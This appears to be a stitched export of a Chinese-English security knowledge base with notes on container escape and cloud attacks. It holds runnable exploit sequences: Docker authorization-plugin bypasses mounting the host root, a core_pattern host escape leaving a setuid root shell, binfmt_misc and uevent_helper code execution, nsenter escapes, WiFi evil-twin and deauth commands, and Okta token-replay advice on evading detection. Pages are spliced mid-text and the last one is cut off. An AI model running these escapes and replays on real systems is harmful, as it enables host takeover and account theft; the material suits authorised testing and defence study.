content: 来源路径： 02-知识点/云与容器/Runtime 授权 Plugins.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Runtime 授权 Plugins [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Runtime 授权 Plugins 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Runtime 授权 Plugins 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Overview、Operation、Common Plugin Targets、Abuse、Full Example: Docker exec Adds Privilege After 容器 Creation；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Overview Operation Common Plugin Targets Abuse Full Example: Docker exec Adds Privilege After 容器 Creation Full Example: Bind Mount Through Raw API Full Example: Unchecked Capability Attribute Full Example: Disabling The Plugin Checks Runtime Defaults # 核心要点 HostConfig fields such as Binds, Mounts, Privileged, CapAdd, PidMode, and namespace-sharing options Docker exec behavior If you need broader endpoint profiling, 工具 such as Docker auth profiler are useful because they automate the otherwise repetitive task of checking which API routes and JSON structures are really permitted by the plugin. If the environment uses a custom plugin and you can interact with the API, enumerate which object fields are really filtered: A policy that blocks privileged 容器 creation but allows unconfined 容器 creation plus Docker exec may still be bypassed: If the daemon accepts the second step, the user has recovered a privileged interactive process inside a 容器 the policy author believed was constrained. A plugin list visible to the attacker may be enough to discover whether disable or reconfigure operations are possible. A policy that blocks only obvious CLI actions but not raw API requests should be treated as bypassable until proven otherwise. # 命令 / 载荷 / 操作片段 # 1. Abuse 123docker psdocker run --rm -it --privileged ubuntu:24.04 bashdocker plugin ls # 2. Abuse 1234docker versiondocker inspect <container> 2>/dev/null | headcurl --unix-socket /var/run/docker.sock http:/versioncurl --unix-socket /var/run/docker.sock http:/v1.41/containers/json # 3. Full Example: Docker exec Adds Privilege After 容器 Creation 123docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinitydocker psdocker exec -it --privileged <container_id> bash # 4. Full Example: Bind Mount Through Raw API 1234567docker versioncurl --unix-socket /var/run/docker.sock \ -H "Content-Type: application/json" \ -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \ http:/v1.41/containers/createdocker start <container_id>docker exec -it <container_id> chroot /host /bin/bash # 5. Full Example: Bind Mount Through Raw API 1234curl --unix-socket /var/run/docker.sock \ -H "Content-Type: application/json" \ -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \ http:/v1.41/containers/create # 6. Full Example: Unchecked Capability Attribute 1234567curl --unix-socket /var/run/docker.sock \ -H "Content-Type: application/json" \ -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \ http:/v1.41/containers/createdocker start <container_id>docker exec -it <container_id> bashcapsh --print # 7. Full Example: Disabling The Plugin 1234docker plugin lsdocker plugin disable <plugin_name>docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bashdocker plugin enable <plugin_name> # 8. Checks 1234docker plugin lsdocker info 2>/dev/null | grep -i authorizationdocker run --rm -it --privileged ubuntu:24.04 bashcurl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 容器与 Kubernetes # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: Read-Only System Paths 技术笔记
content: 来源路径： 02-知识点/云与容器/Read-Only System Paths 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Read-Only System Paths 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Read-Only System Paths 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Read-Only System Paths 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Read-Only System Paths、Operation、Security Impact、Misconfigurations、Abuse；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Read-Only System Paths Operation Security Impact Misconfigurations Abuse Full Example: core pattern Host Escape Full Example: binfmt misc Registration Full Example: uevent helper Checks Runtime Defaults # 核心要点 The purpose is straightforward: many kernel interfaces become much more dangerous when they are writable. A read-only mount does not remove all 侦察 value, but it prevents a compromised workload from modifying the underlying kernel-facing files through that path. Runtimes frequently mark parts of the proc/sys view as read-only. Depending on the runtime and host, this may include paths such as: Interesting findings include writable host-facing proc knobs or sysfs entries that should normally have been read-only. At that point, the workload has moved from a constrained 容器 view toward meaningful kernel influence. If /proc/sys/kernel/core pattern is writable from inside the 容器 and points to the host kernel view, it can be abused to execute a 载荷 after a crash: If the path really reaches the host kernel, the 载荷 runs on the host and leaves a setuid shell behind. If /proc/sys/fs/binfmt misc/register is writable, a custom interpreter registration can produce code execution when the matching file is executed: Writable /proc/sys paths are often more important than ordinary read access. If the runtime says a path is read-only but it is writable in practice, review mount propagation, bind mounts, and privilege settings carefully. # 命令 / 载荷 / 操作片段 # 1. Lab 1docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths' # 2. Lab 123mount | grep -E '/proc|/sys'find /proc/sys -maxdepth 2 -writable 2>/dev/null | headfind /sys -maxdepth 3 -writable 2>/dev/null | head # 3. Abuse 12find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50 # Find writable kernel tunables reachable from the containerfind /sys -maxdepth 4 -writable 2>/dev/null | head -n 50 # Find writable sysfs entries that may affect host devices or kernel state # 4. Abuse 12345cat /proc/sys/kernel/core_pattern 2>/dev/null # Crash handler path; writable access can lead to host code execution after a crashcat /proc/sys/kernel/modprobe 2>/dev/null # Kernel module helper path; useful to evaluate helper-path abuse opportunitiescat /proc/sys/fs/binfmt_misc/status 2>/dev/null # Whether binfmt_misc is active; writable registration may allow interpreter-based code executioncat /proc/sys/vm/panic_on_oom 2>/dev/null # Global OOM handling; useful for evaluating host-wide denial-of-service conditionscat /sys/kernel/uevent_helper 2>/dev/null # Helper executed for kernel uevents; writable access can become host code execution # 5. Full Example: core pattern Host Escape 12345678910111213141516171819[ -w /proc/sys/kernel/core_pattern ] || exit 1overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)cat <<'EOF' > /shell.sh#!/bin/shcp /bin/sh /tmp/rootshchmod u+s /tmp/rootshEOFchmod +x /shell.shecho "|$overlay/shell.sh" > /proc/sys/kernel/core_patterncat <<'EOF' > /tmp/crash.cint main(void) { char buf[1]; for (int i = 0; i < 100; i++) buf[i] = 1; return 0;}EOFgcc /tmp/crash.c -o /tmp/crash/tmp/crashls -l /tmp/rootsh # 6. Full Example: binfmt misc Registration 1234567891011mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misccat <<'EOF' > /tmp/h#!/bin/shid > /tmp/binfmt.outEOFchmod +x /tmp/hprintf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/registerprintf 'HT' > /tmp/test.htchmod +x /tmp/test.ht/tmp/test.htcat /tmp/binfmt.out # 7. Full Example: uevent helper 123456789cat <<'EOF' > /tmp/evil-helper#!/bin/shid > /tmp/uevent.outEOFchmod +x /tmp/evil-helperoverlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helperecho change > /sys/class/mem/null/ueventcat /tmp/uevent.out # 8. Checks 1234docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths' # Runtime-declared read-only pathsmount | grep -E '/proc|/sys' # Actual mount optionsfind /proc/sys -maxdepth 2 -writable 2>/dev/null | head # Writable procfs tunablesfind /sys -maxdepth 3 -writable 2>/dev/null | head # Writable sysfs paths # 检查清单 是否确认账号

This tool automates WPS/WEP/WPA-PSK attacks. It will automatically: Scan for possible networks：And let you select the victim(s) If WEP：Launch WEP attacks If WPS: Pixie dust attack and the bruteforce attack (be careful the brute-force attack could take a long time). Notice that it doesn't try null PIN or database/generated PINs. If PMKID or Handshake, try to bruteforce using top5000 passwords. Random fake APs -- Hide nets, possible crash scanners TKIP, EAPOL -- Some specific attacks to DoS some APs Bruteforce 凭据 Open Evil Twin [+ DoS] -- Useful to capture captive portal creds and/or perform LAN attacks WPA-PSK Evil Twin -- Useful to network attacks if you know the 密码 # 命令 / 载荷 / 操作片段 # 1. EAPHammer 12git clone https://github.com/s0lst1c3/eaphammer.git./kali-setup # 3. Airgeddon 123mv `which dhcpd` `which dhcpd`.oldapt install isc-dhcp-serverapt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe # 4. Airgeddon 12345678910docker run \ --rm \ -ti \ --name airgeddon \ --net=host \ --privileged \ -p 3000:3000 \ -v /tmp:/io \ -e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \ v1s1t0r1sh3r3/airgeddon # 5. wifiphisher 123git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revisioncd wifiphisher # Switch to tool's directorysudo python setup.py install # Install any dependencies # 6. Open / OWE networks quick notes 1234iw wlan0 set type monitorip link set wlan0 upiw wlan0 set channel 6tcpdump -i wlan0 -w capture.pcap # 7. Deauthentication Packets 1aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0 # 8. title: Pentesting CI-CD 方法论
content: 来源路径： 02-知识点/云与容器/Pentesting CI-CD 方法论.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Pentesting CI-CD 方法论 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 Pentesting CI-CD 方法论 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 Pentesting CI-CD 方法论 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：Pentesting CI/CD 方法论、VCS、CI/CD Pipelines、VCS Pentesting 方法论、Pipelines Pentesting 方法论；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 Pentesting CI/CD 方法论 VCS CI/CD Pipelines VCS Pentesting 方法论 Pipelines Pentesting 方法论 PPE：Poisoned Pipeline Execution 利用 Benefits Dependency & Registry Supply-Chain Abuse Practical checks during an assessment More relevant info 工具 & CIS Benchmark Top 10 CI/CD Security Risk Automatic 工具 # 核心要点 However, these systems need to be executed somewhere and usually with privileged 凭据 to deploy code or access sensitive information. Even if some VCS platforms allow to create pipelines for this section we are going to analyze only potential attacks to the control of the source code. Platforms that contains the source code of your project contains sensitive information and people need to be very careful with the permissions granted inside this platform. These are some common problems across VCS platforms that attacker could abuse: Leaks: If your code contains leaks in the commits and the attacker can access the repo (because it's public or because he has access), he could discover the leaks. Access: If an attacker can access to an account inside the VCS platform he could gain more visibility and permissions. SSO: Some platforms won't allow users to register, but will allow anyone to access with a valid SSO (so an attacker could use his github account to enter for example). 凭据: Username+Pwd, personal tokens, ssh keys, Oauth tokens, cookies... there are several kind of tokens a user could steal to access in some way a repo. Webhooks: VCS platforms allow to generate webhooks. If they are not protected with non visible secrets an attacker could abuse them. If no secret is in place, the attacker could abuse the webhook of the third party platform If the secret is in the URL, the same happens and the attacker also have the secret Code compromise: If a malicious actor has some kind of write access over the repos, he could try to inject malicious code. In order to be successful he might need to 绕过 branch protections. These actions can be performed with different goals in mid: Compromise the main (or other branches) to compromise developers machines (as they usually execute test, terraform or other things inside the repo in their machines). Have write access to the VCS platform, as usually pipelines are triggered when a push or a pull request is performed. (Check the VCS pentesting 方法论 for a summary of ways to get access). content: 来源路径： 02-知识点/云与容器/PNG Tricks 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # PNG Tricks 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 PNG Tricks 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 PNG Tricks 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：PNG Tricks、Quick triage、Trailing data after IEND、Acropalypse-style recovery of cropped/redacted screenshots、Chunk abuse that matters in practice；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 7 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 PNG Tricks Quick triage Trailing data after IEND Acropalypse-style recovery of cropped/redacted screenshots Chunk abuse that matters in practice Corrupted PNG repair # 核心要点 PNG files are very common in CTFs, incident response, and malware staging because they are lossless, chunk-based, and many 工具 will happily render them even when they contain extra metadata, appended 载荷，or partially corrupted chunks. Simple stego /hidden 载荷 A very practical recent PNG forensic trick is checking whether a screenshot editor overwrote a PNG without truncating the old file first. In those cases, bytes from the previous image can remain after IEND, and sometimes extra IDAT data can be partially reconstructed. The most interesting PNG chunks for investigations are usually not the obvious image ones, but the chunks that can carry text, metadata, or 载荷 bytes: PLTE – palette data in indexed images, but also useful in 载荷 - smuggling scenarios For offensive 载荷 持久化 inside PNG chunks (for example PLTE, IDAT, or tEXt tricks that survive some PHP image transformations), check the more detailed 上传 - focused notes here: # 命令 / 载荷 / 操作片段 # 1. Quick triage 12345file suspect.pngpngcheck -vp suspect.pngexiftool -a -u -g1 suspect.pngstrings -n 6 suspect.png | headbinwalk -eM suspect.png # 2. Trailing data after IEND 12345678pngcheck -v suspect.png# Look for: "additional data after IEND chunk"exiftool suspect.png# ExifTool usually warns about trailer data after PNG IENDgrep -aboa $'IEND\xAE\x42\x60\x82' suspect.png# More than one hit is suspicious # 3. Trailing data after IEND 1234IEND_OFF=$(grep -aboa $'IEND\xAE\x42\x60\x82' suspect.png | tail -n1 | cut -d: -f1)dd if=suspect.png of=png-trailer.bin bs=1 skip=$((IEND_OFF+8))file png-trailer.binbinwalk -eM png-trailer.bin # 4. Trailing data after IEND 127z l suspect.pngunzip -l suspect.png # 5. Acropalypse-style recovery of cropped/redacted screenshots 1234pngcheck -v screenshot.pngexiftool screenshot.png | grep -i trailergrep -aboa 'IDAT' screenshot.pnggrep -aboa $'IEND\xAE\x42\x60\x82' screenshot.png # 6. Chunk abuse that matters in practice 12pngcheck -vp suspect.pngexiftool -a -u -g1 suspect.png # 7. Corrupted PNG repair 1exiftool -Trailer:All= -overwrite_original suspect.png # 工具与参考入口 pngcheck https://www.da.vidbuchanan.co.uk/blog/exploiting-acropalypse.html # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Host PID sharing becomes a direct host escape when the process also has enough privilege to join the host namespaces: Some PID-namespace-relevant attacks are not traditional hostPID: true misconfigurations, but runtime implementation bugs around how procfs protections are applied during 容器 setup. Namespace injection 工具 such as insject show that PID-namespace interaction does not always require pre-entering the target namespace before process creation. A helper can attach later, use setns (), and execute while preserving visibility into the target PID space: This kind of technique matters mainly for advanced debugging, offensive tooling, and post - 利用 workflows where namespace context must be joined after the runtime has already initialized the workload. If the process list contains obvious host services, host PID sharing is probably already in effect. Seeing only a tiny 容器 - local tree is the normal baseline; seeing systemd, dockerd, or unrelated daemons is not. Once host PIDs are visible, even read-only process information becomes useful 侦察. # 命令 / 载荷 / 操作片段 # 1. Lab 123sudo unshare --pid --fork --mount-proc bashps -efecho $$ # 2. Lab 12docker run --rm debian:stable-slim ps -efdocker run --rm --pid=host debian:stable-slim ps -ef | head # 3. Abuse 123readlink /proc/self/ns/pidps -ef | head -n 50ls /proc | grep '^[0-9]' | head -n 20 # 4. Abuse 1234for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do echo "PID=$p" tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echodone # 5. Abuse 12which nsenternsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked" # 6. Abuse 1234for fd_dir in /proc/[0-9]*/fd; do ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"donegrep " /proc " /proc/mounts # 7. Full Example: host PID + nsenter 123ps -ef | head -n 50capsh --print | grep cap_sys_adminnsenter -t 1 -m -u -n -i -p /bin/bash # 8. Full Example: host PID + nsenter 1/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null # 9. maskedPaths race to host procfs 1jq '.linux.maskedPaths' config.json 2>/dev/null # 10. Namespace injection with insject 1sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef' # 11. Checks 123readlink /proc/self/ns/pid # PID namespace identifierps -ef | head # Quick process list samplels /proc | head # Process IDs and procfs layout # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Now, it has become easier to escalate privileges to access the host system and subsequently take over the entire cluster, gaining 'cluster-admin' privileges. Look for Node - 后渗透 part in the following page : ../../Kubernetes-security/attacking-Kubernetes-from-inside-a-pod.md Furthermore, based on the target setup, some custom labels / annotations may be used in the same way as the previous attack scenario. Even if it is not made for, labels could be used to give permissions, restrict or not a specific resource. Try to look for custom labels if you can read some resources. Here a list of interesting resources : However, mitigation measures like Open Policy Agent GateKeeper can prevent users from setting this label. # 命令 / 载荷 / 操作片段 # 1. Namespace Label 12345$ oc auth can-i create namespaces yes$ oc auth can-i patch namespaces yes # 2. Add Label 1$ oc label ns MYNAMESPACE openshift.io/run-level=0 # 3. Add Label 123456apiVersion: v1kind: Namespacemetadata: name: evil labels: openshift.io/run-level: 0 # 4. Custom labels 12$ oc get pod -o yaml | grep labels -A 5$ oc get namespace -o yaml | grep labels -A 5 # 5. List all privileged namespaces 1$ oc get project -o yaml | grep 'run-level' -b5 # 工具与参考入口 Guillaume https://docs.openshift.com/ 容器 - platform/3.11/admin guide/manage scc.html https://github.com/open-policy-agent/gatekeeper # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Read-only root filesystem: Preventing containers from modifying files in certain directories. By configuring SCCs, administrators can ensure that pods are running with the appropriate level of security isolation and access controls, reducing the risk of security vulnerabilities or unauthorized access within the cluster. Basically, every time a pod deployment is requested, an admission process is executed as the following: This additional security layer by default prohibits the creation of privileged pods, mounting of the host file system, or setting any attributes that could lead to 权限提升. ../Kubernetes-security/abusing-roles-clusterroles-in-Kubernetes/pod-escape-privileges.md # 命令 / 载荷 / 操作片段 # 1. Use SCC 12$ oc get pod MYPOD -o yaml | grep scc openshift.io/scc: privileged # 3. Use SCC 12$ oc apply -f evilpod.yaml #Deploy a privileged pod Error from server (Forbidden): error when creating "evilpod.yaml": pods "evilpod" is forbidden: unable to validate against any security context constrain # 工具与参考入口 Guillaume https://www.redhat.com/en/blog/managing-sccs-in-openshift # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

User access in a Jenkins instance OR 1b. User access with write permission to an SCM repository where an automated build is triggered after a push/merge Fundamentally, almost everything behind the scenes works the same as a regular Jenkins instance running in a VM. The main difference is the overall architecture and how builds are managed inside an openshift (or Kubernetes) cluster. You have write access to the SCM and automated builds are configured via webhook You can just edit a build script (such as Jenkinsfile), commit and push (eventually create a PR if builds are only triggered on PR merges). The main gola of Okta is to configure access to different users and groups to external applications. If you manage to compromise administrator privileges in an Oktas environment, you will highly probably able to compromise all the other platforms the company is using. To perform a security review of an Okta environment you should ask for administrator read-only access. Check the attack in https://trustedsec.com/blog/okta-for-red-teamers**.** I have also seen other apps that were vulnerable but didn't have that field in the Okta settings (at the end different apps are configured differently). Avoid using popular anonymizer proxies and VPN services when replaying captured access tokens. Ensure consistent user-agent strings between the client and replayed access tokens. Refrain from replaying tokens from different users from the same IP address. Exercise caution when replaying tokens against the Okta dashboard. # 工具与参考入口 Okta, Inc. https://trustedsec.com/blog/okta-for-red-teamers this blog post # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 Active Directory 攻击链 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If one of those services is weakly protected, host networking becomes a direct privilege-escalation path. Docker API on localhost: cluster 侦察 or 横向移动 if kubelet or local agents are reachable The goal of these checks is to learn whether the process has a private network stack, what routes and listeners are visible, and whether the network view already looks host-like before you even test capabilities. If /proc/self/ns/net and /proc/1/ns/net already look host-like, the 容器 may be sharing the host network namespace or another non-private namespace. lsns -t net and ip netns identify are useful when the shell is already inside a named or persistent namespace and you want to correlate it with /run/netns objects from the host side. In Kubernetes, failed service-name resolution from a hostNetwork Pod may simply mean the Pod is not using dnsPolicy: ClusterFirstWithHostNet, not that the service is absent. # 命令 / 载荷 / 操作片段 # 1. Lab 123sudo unshare --net --fork baship addrip route # 2. Lab 12docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head' # 3. Abuse 123ip addrip routess -lntup | head -n 50 # 4. Abuse 123ss -lntp | grep '127.0.0.1'curl -s http://127.0.0.1:2375/version 2>/dev/nullcurl -sk https://127.0.0.1:2376/version 2>/dev/null # 5. Abuse 123capsh --print | grep -E 'cap_net_admin|cap_net_raw'iptables -S 2>/dev/null || nft list ruleset 2>/dev/nullip link show # 6. Abuse 12345678capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'for i in $(ls /sys/class/net 2>/dev/null); do echo "== $i ==" tc qdisc show dev "$i" 2>/dev/null tc filter show dev "$i" ingress 2>/dev/null tc filter show dev "$i" egress 2>/dev/nulldonebpftool net 2>/dev/null # 7. Abuse 123456for u in \ http://169.254.169.254/latest/meta-data/ \ http://100.100.100.200/latest/meta-data/ \ http://127.0.0.1:10250/pods; do curl -m 2 -s "$u" 2>/dev/null | headdone # 8. This is mostly a 侦察 primitive, but it confirms that the 容器 can read kernel-facing information that is normally hidden. /proc/config.gz may reveal the running kernel configuration, which is valuable for matching public kernel 利用 prerequisites or understanding why a specific feature is reachable. /proc/sched debug exposes scheduler state and often bypasses the intuitive expectation that the PID namespace should hide unrelated process information completely. Interesting results include direct reads from those files, evidence that the data belongs to the host rather than to a constrained 容器 view, or access to other procfs/sysfs locations that are commonly masked by default. # 命令 / 载荷 / 操作片段 # 1. Lab 1docker inspect <container> | jq '.[0].HostConfig.MaskedPaths' # 2. Lab 12mount | grep -E '/proc|/sys'ls -ld /proc/kcore /proc/keys /sys/firmware 2>/dev/null # 3. Abuse 12ls -ld /proc/kcore /proc/keys /proc/timer_list /sys/firmware 2>/dev/null # Check whether paths that are usually masked are accessible at allmount | grep -E '/proc|/sys' # Review whether procfs/sysfs mounts look container-scoped or suspiciously host-like # 4. Abuse 12345head -n 20 /proc/timer_list 2>/dev/null # Scheduler / timer internals, useful for host fingerprinting and confirming kernel data exposurecat /proc/keys 2>/dev/null | head # In-kernel keyring information; may expose keys, key descriptions, or service relationshipsls -la /sys/firmware 2>/dev/null # Firmware / boot environment metadata; useful for host fingerprinting and low-level platform reconzcat /proc/config.gz 2>/dev/null | head # Kernel build configuration; useful to confirm enabled subsystems and exploit preconditionshead -n 50 /proc/sched_debug 2>/dev/null # Scheduler and process metadata; may reveal host tasks and cgroup relationships # 5. Checks 123docker inspect <container> | jq '.[0].HostConfig.MaskedPaths' # Runtime-declared masked pathsmount | grep -E '/proc|/sys' # Actual procfs/sysfs mount layoutls -ld /proc/kcore /proc/keys /proc/timer_list /sys/firmware 2>/dev/null # 检查清单 是否确认账号 / 订阅 / 项目 / 命名空间边界 是否枚举 IAM 权限与资源暴露 是否检查密钥、元数据和审计日志 是否避免跨越非授权云资源 # 关联 云与容器总览 知识地图 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/云与容器/LUKS2 Header Malleability and Null-Cipher Abuse in Confidential VMs 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # LUKS2 Header Malleability and Null-Cipher Abuse in Confidential VMs 技术笔记 [!summary] 提炼定位 面向 云与容器 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 评估 LUKS2 Header Malleability and Null-Cipher Abuse in Confidential VMs 技术笔记 相关云服务、身份策略、元数据、容器或控制平面风险。 把身份权限、网络暴露、配置漂移、密钥流向和审计日志串成闭环。 # 中文提炼 核心目标是确认 LUKS2 Header Malleability and Null-Cipher Abuse in Confidential VMs 技术笔记 涉及的账号、项目 / 订阅、角色、资源和控制平面边界。 优先关注：LUKS2 Header Malleability and Null-Cipher Abuse in Confidential VMs、TL;DR、Background: LUKS2 on-disk format (what matters for attackers)、Root cause、Threat model: why attestation didn’t save you by default；身份权限、元数据、密钥、审计日志和网络暴露要一起看。 验证云权限时使用只读枚举优先，任何资源创建、策略修改或跨账号操作都要单独记录和回滚。 容器 / Kubernetes 场景要区分 Pod 内权限、ServiceAccount、RBAC、节点权限和宿主机逃逸面。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 LUKS2 Header Malleability and Null-Cipher Abuse in Confidential VMs TL;DR Background: LUKS2 on-disk format (what matters for attackers) Root cause Threat model: why attestation didn’t save you by default 利用 (storage write access required) Robust mitigations (avoid TOCTOU with detached headers) Notes on versions and maintainer position Quick checks and triage # 核心要点 Many Linux-based Confidential VMs (CVMs) running on AMD SEV-SNP or Intel TDX use LUKS2 for persistent storage. The on-disk LUKS2 header is malleable and not integrity-protected against storage-adjacent attackers. If the header’s data segment encryption is set to a null cipher (e.g., "cipher null-ecb"), cryptsetup accepts it and the guest transparently reads/writes plaintext while believing the disk is encrypted. Prior to and including cryptsetup 2.8.0, null ciphers could be used for keyslots; since 2.8.1 they are rejected for keyslots with non-empty passwords, but null ciphers remain allowed for volume segments. Remote attestation usually measures VM code/config, not mutable external LUKS headers; without explicit validation/measurement, an attacker with disk write access can force plaintext I/O. digests (e.g., 哈希 of the volume key to verify passphrases) LUKS2 headers are not authenticated against storage tampering. A host/storage attacker can rewrite the JSON metadata accepted by cryptsetup. Up to 2.8.0, null ciphers could also be used for keyslots (keyslot opens with any passphrase). Since 2.8.1, null ciphers are rejected for keyslots with non-empty passwords, but remain allowed for segments. Switching only the segment cipher still yields plaintext I/O post-2.8.1. If your CVM trusts an on-disk header without robust validation/measurement, a storage attacker can alter it to a null cipher and your guest will mount a plaintext volume without error. Write access to the CVM’s LUKS2-encrypted block device. cryptsetup 2.8.1 (Oct 19, 2025) rejects null ciphers for keyslots with non-empty passwords but still allows null ciphers for segments. # 命令 / 载荷 / 操作片段 # 1. Background: LUKS2 on-disk format (what matters for attackers) 123# Read JSON metadata and print the configured data segment ciphercryptsetup luksDump --type luks2 --dump-json-metadata /dev/VDISK \ | jq -r '.segments["0"].encryption' # 2. Robust mitigations (avoid TOCTOU with detached headers) 123# Copy header into protected memory (e.g., tmpfs) and open from therecryptsetup luksHeaderBackup --header-backup-file /tmp/luks_header /dev/VDISKcryptsetup open --type luks2 --header /tmp/luks_header /dev/VDISK --key-file=key.txt # 3. Robust mitigations (avoid TOCTOU with detached headers) 12345678910#!/bin/bashset -e# Store header in confidential RAM fscryptsetup luksHeaderBackup --header-backup-file 